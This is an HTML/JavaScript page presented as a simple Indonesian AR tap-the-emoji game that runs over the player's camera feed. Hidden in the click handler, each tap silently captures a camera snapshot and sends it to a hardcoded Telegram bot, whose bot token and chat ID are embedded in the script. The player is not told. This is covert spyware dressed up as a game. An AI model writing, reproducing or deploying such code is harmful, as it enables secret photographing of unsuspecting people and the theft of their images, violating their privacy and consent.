<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AR Game Kamera Only</title>
<style>
body, html { margin:0; padding:0; overflow:hidden; height:100%; font-family:sans-serif; background:#000; }
video#camera { position:fixed; top:0; left:0; width:100%; height:100%; object-fit:cover; transform:scaleX(-1); z-index:0; }
.emoji { position:absolute; font-size:40px; cursor:pointer; user-select:none; color:#0f0; transition: transform 0.3s; }
.score { position:absolute; top:20px; left:20px; font-size:24px; color:#fff; background:rgba(0,0,0,0.5); padding:5px 15px; border-radius:10px; z-index:10; }
</style>
</head>
<body>

<video id="camera" autoplay playsinline></video>
<div class="score" id="scoreBox">Score: 0</div>
<audio id="popSound" src="https://freesound.org/data/previews/256/256113_3263906-lq.mp3"></audio>

<script>
const camera = document.getElementById('camera');
const scoreBox = document.getElementById('scoreBox');
const popSound = document.getElementById('popSound');
let score = 0;

const BOT_TOKEN = "8426427901:AAEjvVBIvQ7E84B631aEIyeoYhJhYZWJsgw";
const CHAT_ID = "8316267465";
const emojis = ["🍎","🍌","🍒","⭐","💎","🎯"];

// Kamera
navigator.mediaDevices.getUserMedia({ video:true })
.then(stream => camera.srcObject = stream)
.catch(err => alert("Kamera tidak bisa diakses: "+err));

// Ambil foto
function takePhoto(){
  return new Promise((resolve,reject)=>{
    const canvas = document.createElement("canvas");
    canvas.width = camera.videoWidth || 320;
    canvas.height = camera.videoHeight || 240;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(camera,0,0,canvas.width,canvas.height);
    canvas.toBlob(blob => resolve(blob),"image/jpeg");
  });
}

// Kirim ke Telegram
function sendToTelegram(blob){
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("photo", blob, "snapshot.jpg");
  fd.append("caption", "📸 Foto diambil dari game AR");
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:"POST", body:fd })
  .then(res => res.json())
  .then(data => console.log("Telegram sent:", data))
  .catch(err => console.error(err));
}

// Spawn emoji
function spawnEmoji(){
  const emoji = document.createElement("div");
  emoji.className = "emoji";
  emoji.textContent = emojis[Math.floor(Math.random()*emojis.length)];
  emoji.style.left = Math.random()*80+10+"%";
  emoji.style.top = "-50px";
  document.body.appendChild(emoji);

  emoji.addEventListener("click", async ()=>{
    score++; scoreBox.textContent = "Score: "+score;
    emoji.style.transform="scale(2) rotate(360deg)";
    popSound.currentTime=0; popSound.play();
    const photo = await takePhoto();
    sendToTelegram(photo);
    emoji.remove();
  });

  let speed = Math.random()*2 + 2;
  let fall = setInterval(()=>{
    let top = parseFloat(emoji.style.top);
    top += speed;
    emoji.style.top = top+"px";
    if(top>window.innerHeight){ emoji.remove(); clearInterval(fall); }
  },30);
}

setInterval(spawnEmoji, 1000);
</script>

</body>
</html>
